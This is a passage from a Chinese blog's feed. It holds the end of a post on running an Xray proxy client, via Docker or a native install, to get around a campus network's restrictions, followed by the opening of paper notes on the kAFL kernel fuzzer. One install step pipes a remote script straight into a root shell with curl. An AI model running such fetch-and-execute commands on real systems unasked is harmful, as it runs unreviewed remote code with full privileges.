class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> debian:latest<br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl wget unzip procps</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -P /root/ https://github.com/XTLS/Xray-core/releases/download/v1.8.24/Xray-linux-64.zip</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> unzip /root/Xray-linux-64.zip -d /root/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/xray</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./config.json /root/config.json</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\n/root/xray run -config /root/config.json\nsleep infinity&quot;</span> &gt; /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /var/log/xray</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>接下来构建镜像，启动容器，并让容器与主机使用同样的网络：</p><blockquote><p>之所以不用端口转发是因为 docker 的端口转发在笔者本地似乎有些小问题，没有办法连接……（但是转发 ssh 又可以，有点奇怪）</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t a3xray .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --name=a3xray --network=host a3xray</span><br></code></pre></td></tr></table></figure><p>然后找自己桌面环境对应的 Proxy 设置即可，以下是 KDE 环境下配置成功的界面：</p><p><img src="https://s2.loli.net/2024/09/19/HcYb9dBQ6vDImMO.png"></p><h3 id="方法二：直接在真机上安装客户端"><a href="#方法二：直接在真机上安装客户端" class="headerlink" title="方法二：直接在真机上安装客户端"></a>方法二：直接在真机上安装客户端</h3><p>笔者物理机使用的是 openSUSE Tumbleweed，默认使用 systemd ，所以也可以直接使用官方提供的一键式安装脚本在本地进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo bash -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)</span>&quot;</span> @ install</span><br></code></pre></td></tr></table></figure><p>然后编写 <code>/usr/local/etc/xray/config.json</code> ：</p><blockquote><p>这里笔者直接用 Windows 上 v2rayN 自动导出的，再稍微格式化了一下，懒得自己写了：）</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 本地代理端口例如<span class="hljs-number">10808</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;routeOnly&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;allowTransparent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 本地代理端口例如<span class="hljs-number">10809</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;routeOnly&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;allowTransparent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chacha20&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;ota&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的密码&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">443</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;security&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;tls&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;tlsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;allowInsecure&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;serverName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fingerprint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chrome&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/你的子路径&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;mux&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;concurrency&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;direct&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;response&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;hosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dns.google&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;proxy.example.com&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;你的域名&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geosite:cn&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;geosite:geolocation-cn&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;expectIPs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geoip:cn&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;1.1.1.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;https://dns.google/dns-query&quot;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;domainStrategy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AsIs&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;rules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;inboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;api&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;api&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;443&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;udp&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0-65535&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>然后启动 xray：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now xray.service</span><br></code></pre></td></tr></table></figure><p>最后找自己桌面环境对应的 Proxy 设置即可，以下是 Gnome 环境下配置成功的界面：</p><p><img src="https://s2.loli.net/2024/09/19/QiM9D76dvE8nIl1.png" alt="这是 Gnome"></p><h1 id="0xFF-What’s-more…"><a href="#0xFF-What’s-more…" class="headerlink" title="0xFF. What’s more…"></a>0xFF. What’s more…</h1><p>虽然说这个方案确乎是配置成功了，从原理上看似乎也是非常的安全，但是最终 <strong>还是没有办法在澳洲的校园网里玩原神</strong> ，主要原因是 <strong>延迟实在是太高了</strong> ……</p><p>不过至少到最后至少是收获了一些运维的小技巧不是么：）</p><p><img src="https://s2.loli.net/2024/09/18/3NVGfOJLndohSEm.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个原神啊，能忍住一秒不玩的都是神人了&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="原神" scheme="https://arttnba3.github.io/tags/%E5%8E%9F%E7%A5%9E/"/>
    
    <category term="Firewall" scheme="https://arttnba3.github.io/tags/Firewall/"/>
    
    <category term="VPN" scheme="https://arttnba3.github.io/tags/VPN/"/>
    
    <category term="NGINX" scheme="https://arttnba3.github.io/tags/NGINX/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x07】论文笔记：kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels</title>
    <link href="https://arttnba3.github.io/2024/07/30/PAPER-0X07-KAFL/"/>
    <id>https://arttnba3.github.io/2024/07/30/PAPER-0X07-KAFL/</id>
    <published>2024-07-30T11:53:16.000Z</published>
    <updated>2024-07-30T14:29:19.228Z</updated>
    
    <content type="html"><![CDATA[<p>Rabbit’s adventures in kernel land</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>在<a href="https://arttnba3.cn/2023/10/27/PAPER-0X04-HYPER_CUBE/">上一篇论文</a>当中我们介绍了这个作者针对虚拟机设计的 fuzzer，这次我们来看他的<a href="https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-schumilo.pdf">另一篇</a>使用 Intel PT 技术辅助的一个针对 OS kernel 设计的 fuzzer：<a href="https://github.com/RUB-SysSec/kAFL">kAFL</a></p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>基于反馈的 fuzzing 非常强大，但对内核进行 fuzz 难以应用反馈机制（即代码覆盖率指导），且内核 crash 导致的 os 重启会影响 fuzz 的性能</p><p>本文使用虚拟化技术与 Intel PT（Processor Trace）技术带来独立于 OS 的硬件辅助的 fuzzing 解决方案，这使得我们只需要额外开发一小部分与内核交互的用户空间组件；作者还开发了 <a href="https://github.com/RUB-SysSec/kAFL">kernel-AFL 框架</a>，并在 Linux、Windows、macOS 上找到数个漏洞</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p>经典的不用看的章节</p></blockquote><p>过去人们主要关注更容易被利用的用户态应用的安全漏洞，而随着用户态的各种加固，内核开始更加吸引攻击者</p><p>模糊测试长期以来被用来寻找漏洞，最新的反馈驱动型 fuzzer 通过反馈机制学习输入的有趣性并以此生成更多可能触发新路径的输入，但最火的 AFL 仅限于用户空间，fuzz 内核存在一系列额外的挑战：crash 与 timeout 需要虚拟化技术捕获并优雅地继续、内核代码存在更多不确定性、缺少 fuzz 命令行程序那样通过 stdin 直接输入的简易方法、部分内核组件不开源而无法在性能不损耗的情况下插桩</p><p>过去的内核 fuzzing 方法依赖于特定的驱动或是重编译，且由于使用模拟的缘故速度非常慢，或是非反馈驱动</p><p>本文介绍一种无需 ring0 代码甚至特定于 OS 的代码便能够对任意（甚至闭源）x86-64 内核进行 feedback fuzzing 的技术，实现为 kernel-AFL，Intel PT 技术提供了控制流信息，且生成反馈信息的开销极小（5%）</p><p>总而言之，本篇论文贡献如下：</p><ul><li><strong>OS independence</strong>：作者展示了使用 VMM 生成覆盖率来对大部分闭源内核组件进行反馈驱动 fuzzing 是可行的</li><li><strong>Hardware-assisted feedback</strong>：作者使用了 Intel Process Trace 技术，其开销极小</li><li><strong>Extensible and modular design</strong>：作者使用了模块化设计，方便支持其他的 x86 内核&#x2F;用户组件</li><li><strong>kernel-AFL</strong>：作者使用自己的理念开发了原型系统 <a href="https://github.com/RUB-SysSec/kAFL">kernel-AFL</a></li></ul><h1 id="0x02-Technical-Background"><a href="#0x02-Technical-Background" class="headerlink" title="0x02. Technical Background"></a>0x02. Technical Background</h1><p>本节介绍后续章节涉及的硬件特性</p><h2 id="2-1-x86-64-Virtual-Memory-Layouts"><a href="#2-1-x86-64-Virtual-Memory-Layouts" class="headerlink" title="2.1 x86-64 Virtual Memory Layouts"></a>2.1 x86-64 Virtual Memory Layouts</h2><p>内核空间通常位于虚拟高地址部分而用户空间位于低地址部分，OS 处理任务通常不会切换 CR3，而是在同一地址空间处理</p><h2 id="2-2-Intel-VT-x"><a href="#2-2-Intel-VT-x" class="headerlink" title="2.2 Intel VT-x"></a>2.2 Intel VT-x</h2><p>我们将 CPU 分为三类：物理 CPU、逻辑 CPU（超线程可能带来多于物理 CPU 数量的逻辑 CPU，但仅有一个同时活动）、虚拟 CPU（基于逻辑 CPU 建立）</p><p>虚拟化中角色分为两种：虚拟机监视器（Virtual Machine Monitor）和虚拟机（Virtual Machine），VMM 管控 VM，VM 在 VMM 提供的透明上下文中执行</p><p>Intel VT-x 技术提供了硬件辅助的 CPU 虚拟化特性，将 CPU 额外分为 VMXOFF（不开启虚拟化）与 VMXON（开启虚拟化）的运行模式，并区分 VMX non-root（用于 VM）与 VMX root（用于 VMM）两种执行模式</p><p>VM 可能通过各种原因触发 VM-Exit 事件将控制权转交给 VMM 进行处理，VMM 通过包含 vCPU 信息的 VMCS 结构创建、启动、控制 VM</p><h2 id="2-3-Intel-PT"><a href="#2-3-Intel-PT" class="headerlink" title="2.3 Intel PT"></a>2.3 Intel PT</h2><p>Intel 自第五代处理器引入 Intel PT 技术，提供执行和分支跟踪信息，不同于 <code>Intel Last Branch Record</code> 